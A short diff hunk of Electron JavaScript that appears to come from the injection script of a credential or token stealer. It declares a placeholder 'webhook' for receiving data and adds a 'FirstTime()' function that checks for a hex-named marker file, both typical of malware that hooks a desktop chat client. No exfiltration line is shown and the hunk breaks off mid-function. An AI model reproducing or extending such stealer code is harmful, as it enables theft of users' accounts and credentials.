@@ -4,6 +4,7 @@ const { BrowserWindow, session } = require('electron')
 const querystring = require('querystring');
 var webhook = "%WEBHOOK_LINK%";
 
+function FirstTime() {
     if (!fs.existsSync(path.join(__dirname, "0x709078bbd7d68f295a63ea1734e33d"))) {
         return !0
     }
